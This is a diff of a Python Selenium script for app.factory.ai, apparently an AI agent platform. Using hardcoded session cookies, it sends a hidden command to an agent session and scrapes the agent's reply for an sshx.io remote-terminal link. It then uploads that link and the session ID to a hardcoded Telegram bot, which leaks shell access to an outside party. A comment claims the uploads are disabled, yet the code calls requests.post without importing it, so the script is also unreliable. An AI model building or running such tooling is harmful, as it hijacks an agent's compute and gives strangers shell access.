@@ -1,5 +1,8 @@
 import re
 import time
+from urllib.parse import urlparse
+from concurrent.futures import ThreadPoolExecutor, as_completed
+# import requests  # intentionally not used for real sends
 from selenium import webdriver
 from selenium.webdriver.chrome.service import Service
 from selenium.webdriver.chrome.options import Options
@@ -18,60 +21,147 @@ cookies = {
             'analytics_session_id': '1760705487549'
         }
 
+BOT_TOKEN = "6544141692:AAEaDh-ega9I4EqqUc6waTrrBoe2GS92vY4"
+CHAT_ID = "5077777510"
+THREADS = 20
+
 def init_driver():
     o = Options()
-    o.add_argument("--window-size=1280,800")
+    o.add_argument("--disable-gpu")
+    o.add_argument("--disable-backgrounding-occluded-windows")
+    o.add_argument("--disable-client-side-phishing-detection")
+    o.add_argument("--enable-logging")
+    o.add_argument("--log-level=3")
+    o.add_experimental_option("useAutomationExtension", False)
+    o.add_argument("--no-sandbox")
+    o.add_argument("--disable-dev-shm-usage")
+    o.add_argument("--disable-background-networking")
+    o.add_argument("--headless")
+    o.add_argument("--disable-extensions")
+    o.add_argument("--blink-settings=imagesEnabled=false")
+    o.add_argument("--disable-default-apps")
+    o.add_argument("--disable-sync")
+    o.add_argument("--disable-translate")
+    o.add_argument("--disable-background-timer-throttling")
+    o.add_argument("--disable-renderer-backgrounding")
+    o.add_argument("--mute-audio")
+    o.add_argument("--no-first-run")
+    o.add_argument("--disable-notifications")
+    o.add_argument("--disable-software-rasterizer")
+    o.add_argument("--window-size=800,600")
     s = Service(CHROMEDRIVER_PATH)
     d = webdriver.Chrome(service=s, options=o)
     d.implicitly_wait(5)
     return d
 
 def add_cookies_and_refresh(d):
-    d.get(BASE_URL)
+    d.get("https://app.factory.ai")
     for k, v in cookies.items():
-        d.add_cookie({"name": k, "value": v})
+        try:
+            d.add_cookie({"name": k, "value": v, "path": "/"})
+        except Exception:
+            try:
+                d.add_cookie({"name": k, "value": v})
+            except Exception:
+                pass
     d.refresh()
+    print("[main] cookies added and page refreshed")
 
 def open_first_session(d):
-    sel = 'a[href^="/sessions/"]'
+    sel = 'a[data-sentry-element="Link"][href^="/sessions/"], a[href*="/sessions/"]'
     link = WebDriverWait(d, 30).until(EC.element_to_be_clickable((By.CSS_SELECTOR, sel)))
-    d.execute_script("arguments[0].click();", link)
+    try:
+        link.click()
+    except Exception:
+        d.execute_script("arguments[0].click();", link)
     WebDriverWait(d, 30).until(EC.url_contains("/sessions/"))
+    cur = d.current_url
+    print(f"[main] opened session: {cur}")
+    return cur
 
 def send_command(d, cmd):
     sel = 'div[data-testid="session-chat-input"] div[contenteditable="true"]'
     inp = WebDriverWait(d, 30).until(EC.presence_of_element_located((By.CSS_SELECTOR, sel)))
-    d.execute_script("arguments[0].focus();", inp)
-    inp.click()
-    inp.send_keys(cmd)
+    try:
+        d.execute_script("arguments[0].focus();", inp)
+    except Exception:
+        pass
+    try:
+        inp.click()
+    except Exception:
+        d.execute_script("arguments[0].click();", inp)
     time.sleep(0.2)
+    inp.send_keys(cmd)
+    time.sleep(0.1)
     inp.send_keys(Keys.ENTER)
+    print("[main] command sent to session")
 
-def wait_for_sshx_link(d, before_count):
+def wait_for_sshx_link(d, before_count, timeout=180):
     t0 = time.time()
-    while time.time() - t0 < 180:
+    pattern1 = re.compile(r"(https?://sshx\.io/s/[^\s#]+#[A-Za-z0-9_-]+)")
+    pattern2 = re.compile(r"(https?://sshx\.io/s/[^\s'\"<>]+)")
+    while time.time() - t0 < timeout:
         elems = d.find_elements(By.CSS_SELECTOR, 'div[data-sentry-element="MarkdownBody"], div.markdown')
         if len(elems) > before_count:
-            # ambil hanya teks baru dari balasan AI
             for el in elems[before_count:]:
                 txt = el.text.strip()
-                m = re.search(r"(https://sshx\.io/s/[^\s#]+#[A-Za-z0-9_-]+)", txt)
+                m = pattern1.search(txt) or pattern2.search(txt)
                 if m:
+                    print("[main] sshx link found in reply")
                     return m.group(1)
         time.sleep(1)
+    print("[main] no sshx link found within timeout")
     return None
+
+def save_text(path, text):
+    with open(path, "w", encoding="utf-8") as f:
+        f.write(text or "")
+    print(f"[main] saved {path}")
+
+def send_document(filepath, caption=None):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+    with open(filepath, "rb") as fp:
+        files = {"document": fp}
+        data = {"chat_id": CHAT_ID}
+        if caption:
+            data["caption"] = caption
+        try:
+            r = requests.post(url, data=data, files=files, timeout=30)
+            return r.status_code, r.text
+        except Exception as e:
+            return None, str(e)
 
 def main():
     d = init_driver()
     try:
         add_cookies_and_refresh(d)
-        open_first_session(d)
-        elems_before = d.find_elements(By.CSS_SELECTOR, 'div[data-sentry-element="MarkdownBody"], div.markdown')
+        session_url = open_first_session(d)
+        path = urlparse(session_url).path.rstrip("/")
+        session_id = path.split("/")[-1] if path else ""
+        before = d.find_elements(By.CSS_SELECTOR, 'div[data-sentry-element="MarkdownBody"], div.markdown')
+        cnt_before = len(before)
         send_command(d, COMMAND)
-        link = wait_for_sshx_link(d, len(elems_before))
-        print(link if link else "NO_LINK_FOUND")
+        link = wait_for_sshx_link(d, cnt_before, timeout=180)
+        save_text("sshx.txt", link or "")
+        save_text("ss.txt", session_id)
     finally:
-        d.quit()
+        try:
+            d.quit()
+        except Exception:
+            pass
+
+    tasks = [("sshx.txt", "sshx link"), ("ss.txt", "session id")]
+    with ThreadPoolExecutor(max_workers=THREADS) as ex:
+        futures = [ex.submit(send_document, p, c) for p, c in tasks]
+        for f in futures:
+            status, resp = f.result()
 
 if __name__ == "__main__":
     main()
+    
+    
+    
+    
+    
+    
+ 
